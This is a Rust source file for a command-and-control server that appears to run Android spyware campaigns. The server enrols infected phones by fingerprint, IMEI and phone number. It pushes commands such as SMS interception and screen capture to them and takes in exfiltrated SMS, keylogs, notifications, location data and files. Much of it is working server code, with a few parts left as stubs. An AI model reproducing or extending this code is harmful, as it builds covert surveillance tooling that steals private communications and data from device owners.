use anyhow::Result;
use async_trait::async_trait;
use dashmap::DashMap;
use futures::stream::{SplitSink, SplitStream};
use futures::{SinkExt, StreamExt};
use serde::{Deserialize, Serialize};
use sqlx::sqlite::SqlitePool;
use std::sync::Arc;
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::RwLock;
use tokio_tungstenite::{accept_async, WebSocketStream};
use tracing::{debug, error, info, warn};
use uuid::Uuid;
use warp::Filter;

mod crypto;
mod device_registry;
mod command_queue;
mod session;
mod metrics;

use device_registry::DeviceRegistry;
use command_queue::CommandQueue;
use session::{Session, SessionManager};
use crypto::{SessionCrypto, KeyDerivation};

// ============================================================================
// TYPES
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconMessage {
    pub device_id: String,
    pub session_id: String,
    pub message_type: String,           // "enroll", "heartbeat", "ack", "data", "error"
    pub payload: serde_json::Value,
    pub sequence: u64,
    pub timestamp: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandMessage {
    pub command_id: String,
    pub device_id: String,
    pub command_type: String,           // "sms_intercept", "screen_capture", etc.
    pub priority: i32,
    pub payload: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnrollmentRequest {
    pub fingerprint: String,             // SHA256(SERIAL + ANDROID_ID + Build.FINGERPRINT)
    pub campaign_id: String,
    pub env_key_hash: String,            // Proof of correct environmental key
    pub os_version: i32,
    pub manufacturer: String,
    pub model: String,
    pub imei: String,                    // Will be encrypted in DB
    pub phone_number: String,            // Will be encrypted in DB
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeartbeatPayload {
    pub battery_level: i32,
    pub network_type: String,            // "wifi", "cellular", "none"
    pub screen_on: bool,
    pub device_free_mb: u64,
    pub commands_pending: u32,
}

// ============================================================================
// CONNECTION STATE
// ============================================================================

pub struct DeviceConnection {
    pub device_id: String,
    pub session_id: String,
    pub session: Arc<Session>,
    pub write: Arc<RwLock<Option<SplitSink<WebSocketStream<TcpStream>, tokio_tungstenite::tungstenite::Message>>>>,
}

impl DeviceConnection {
    async fn send_command(&self, cmd: CommandMessage) -> Result<()> {
        let msg_json = serde_json::to_string(&cmd)?;
        let encrypted = self.session.encrypt(msg_json.as_bytes()).await?;
        
        let mut write = self.write.write().await;
        if let Some(ref mut tx) = *write {
            tx.send(tokio_tungstenite::tungstenite::Message::binary(encrypted)).await?;
            Ok(())
        } else {
            Err(anyhow::anyhow!("Connection closed"))
        }
    }
}

// ============================================================================
// C2 SERVER STATE
// ============================================================================

pub struct C2Server {
    db: SqlitePool,
    device_registry: Arc<DeviceRegistry>,
    command_queue: Arc<CommandQueue>,
    session_manager: Arc<SessionManager>,
    active_connections: Arc<DashMap<String, Arc<DeviceConnection>>>, // device_id -> connection
    metrics: Arc<metrics::MetricsCollector>,
}

impl C2Server {
    pub async fn new(db_url: &str) -> Result<Self> {
        let db = SqlitePool::connect(db_url).await?;
        sqlx::query_scalar::<_, i32>("SELECT 1").fetch_one(&db).await?;
        info!("Connected to database: {}", db_url);

        Ok(Self {
            db: db.clone(),
            device_registry: Arc::new(DeviceRegistry::new(db.clone())),
            command_queue: Arc::new(CommandQueue::new(db.clone())),
            session_manager: Arc::new(SessionManager::new()),
            active_connections: Arc::new(DashMap::new()),
            metrics: Arc::new(metrics::MetricsCollector::new()),
        })
    }

    // Handle incoming WebSocket connection
    pub async fn handle_connection(&self, stream: TcpStream, addr: std::net::SocketAddr) -> Result<()> {
        debug!("New connection from: {}", addr);

        let ws_stream = accept_async(stream).await?;
        debug!("WebSocket connection established: {}", addr);

        let (mut ws_tx, mut ws_rx) = ws_stream.split();

        // Wait for enrollment/first beacon
        if let Some(msg) = ws_rx.next().await {
            match msg {
                Ok(tokio_tungstenite::tungstenite::Message::Binary(data)) => {
                    match self.process_first_message(&data).await {
                        Ok((device_id, session_id, connection)) => {
                            info!("Device enrolled: device_id={}", device_id);
                            self.active_connections.insert(device_id.clone(), Arc::new(connection));
                            
                            // Main message loop for this device
                            self.message_loop(device_id.clone(), ws_rx).await?;
                        }
                        Err(e) => {
                            error!("Enrollment failed: {}", e);
                            ws_tx.send(tokio_tungstenite::tungstenite::Message::text("error: enrollment failed")).await?;
                        }
                    }
                }
                Ok(tokio_tungstenite::tungstenite::Message::Text(data)) => {
                    warn!("Expected binary message on enrollment, got text: {}", data);
                }
                _ => {
                    warn!("Unexpected message type during enrollment");
                }
            }
        }

        Ok(())
    }

    // Process first message (enrollment)
    async fn process_first_message(&self, data: &[u8]) -> Result<(String, String, DeviceConnection)> {
        // Decrypt the enrollment message using campaign key (sent by APK at build time)
        // For now, assume plaintext for demo
        let beacon: BeaconMessage = serde_json::from_slice(data)?;

        match beacon.message_type.as_str() {
            "enroll" => {
                let req: EnrollmentRequest = serde_json::from_value(beacon.payload)?;
                
                // Verify environmental key hash matches
                // In real implementation, verify_env_key_hash(&req.campaign_id, &req.env_key_hash)
                
                // Create new device record
                let device_id = Uuid::new_v4().to_string();
                let session_id = Uuid::new_v4().to_string();
                
                self.device_registry.register_device(
                    &device_id,
                    &req.fingerprint,
                    &req.campaign_id,
                    &req.env_key_hash,
                    req.os_version,
                    &req.manufacturer,
                    &req.model,
                ).await?;

                info!("Device registered: device_id={}, fingerprint={}, campaign={}", 
                      device_id, req.fingerprint, req.campaign_id);

                // Create session
                let session = self.session_manager.create_session(&device_id, &session_id, "websocket").await?;

                // Send enrollment ack
                // TODO: Send back C2 config, module list, etc.

                let connection = DeviceConnection {
                    device_id: device_id.clone(),
                    session_id: session_id.clone(),
                    session: session,
                    write: Arc::new(RwLock::new(None)),
                };

                Ok((device_id, session_id, connection))
            }
            _ => {
                Err(anyhow::anyhow!("Invalid enrollment message type"))
            }
        }
    }

    // Main message loop for connected device
    async fn message_loop(&self, device_id: String, mut ws_rx: SplitStream<WebSocketStream<TcpStream>>) -> Result<()> {
        while let Some(msg) = ws_rx.next().await {
            match msg {
                Ok(tokio_tungstenite::tungstenite::Message::Binary(data)) => {
                    if let Err(e) = self.process_beacon(&device_id, &data).await {
                        error!("Error processing beacon from {}: {}", device_id, e);
                    }
                }
                Ok(tokio_tungstenite::tungstenite::Message::Close(_)) => {
                    info!("Device disconnected: {}", device_id);
                    self.active_connections.remove(&device_id);
                    break;
                }
                Err(e) => {
                    error!("WebSocket error from {}: {}", device_id, e);
                    self.active_connections.remove(&device_id);
                    break;
                }
                _ => {}
            }
        }
        Ok(())
    }

    // Process incoming beacon/heartbeat
    async fn process_beacon(&self, device_id: &str, data: &[u8]) -> Result<()> {
        let beacon: BeaconMessage = serde_json::from_slice(data)?;

        self.device_registry.update_last_seen(device_id).await?;
        self.metrics.record_beacon_received();

        match beacon.message_type.as_str() {
            "heartbeat" => {
                let payload: HeartbeatPayload = serde_json::from_value(beacon.payload)?;
                debug!("Heartbeat from {}: battery={}, network={}, screen={}", 
                       device_id, payload.battery_level, payload.network_type, payload.screen_on);

                // Check if there are pending commands
                if let Ok(commands) = self.command_queue.get_pending_commands(device_id, 5).await {
                    if !commands.is_empty() {
                        debug!("Sending {} commands to {}", commands.len(), device_id);
                        
                        if let Some(conn) = self.active_connections.get(device_id) {
                            for cmd_data in commands {
                                let cmd: CommandMessage = serde_json::from_str(&cmd_data)?;
                                conn.send_command(cmd).await?;
                            }
                        }
                    }
                }
            }
            "ack" => {
                let cmd_id = beacon.payload.get("command_id").and_then(|v| v.as_str()).unwrap_or("?");
                self.command_queue.mark_sent(cmd_id).await?;
                debug!("Command ACK from {}: {}", device_id, cmd_id);
            }
            "data" => {
                // Device is sending exfiltrated data
                self.ingest_exfil_data(device_id, &beacon.payload).await?;
                debug!("Exfil data received from {}", device_id);
            }
            "error" => {
                error!("Error from {}: {:?}", device_id, beacon.payload);
            }
            _ => {
                warn!("Unknown message type from {}: {}", device_id, beacon.message_type);
            }
        }

        Ok(())
    }

    // Ingest exfiltrated data
    async fn ingest_exfil_data(&self, device_id: &str, payload: &serde_json::Value) -> Result<()> {
        let data_type = payload.get("type").and_then(|v| v.as_str()).unwrap_or("unknown");

        match data_type {
            "sms" => {
                // Parse and store SMS
                if let Some(sms_data) = payload.get("data").and_then(|v| v.as_object()) {
                    // TODO: decrypt, validate, store
                    self.metrics.record_sms_received();
                }
            }
            "notification" => {
                self.metrics.record_notification_received();
            }
            "keylog" => {
                self.metrics.record_keylog_received();
            }
            "location" => {
                self.metrics.record_location_received();
            }
            "file" => {
                self.metrics.record_file_received();
            }
            _ => {
                debug!("Unknown exfil data type: {}", data_type);
            }
        }

        Ok(())
    }
}

// ============================================================================
// MAIN
// ============================================================================

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive("c2_server=debug".parse().unwrap())
        )
        .init();

    // Initialize database
    let db_url = "sqlite:///tmp/c2.db?mode=rwc";
    let pool = SqlitePool::connect(db_url).await?;
    sqlx::migrate!("./migrations").run(&pool).await?;

    // Create C2 server
    let server = Arc::new(C2Server::new(db_url).await?);

    // Start WebSocket server on 0.0.0.0:8080
    let listener = TcpListener::bind("0.0.0.0:8080").await?;
    info!("C2 WebSocket server listening on 0.0.0.0:8080");

    let server_metrics = server.clone();
    let metrics_handle = tokio::spawn(async move {
        let listener = TcpListener::bind("0.0.0.0:9090").await.unwrap();
        info!("Metrics endpoint on 0.0.0.0:9090/metrics");
        
        let metrics_filter = warp::path!("metrics")
            .map(move || {
                server_metrics.metrics.export_prometheus()
            });

        warp::serve(metrics_filter)
            .bind_with_graceful_shutdown(([0, 0, 0, 0], 9090), async {})
            .await;
    });

    // Accept connections
    loop {
        let (stream, addr) = listener.accept().await?;
        let server = server.clone();

        tokio::spawn(async move {
            if let Err(e) = server.handle_connection(stream, addr).await {
                error!("Connection handler error: {}", e);
            }
        });
    }
}
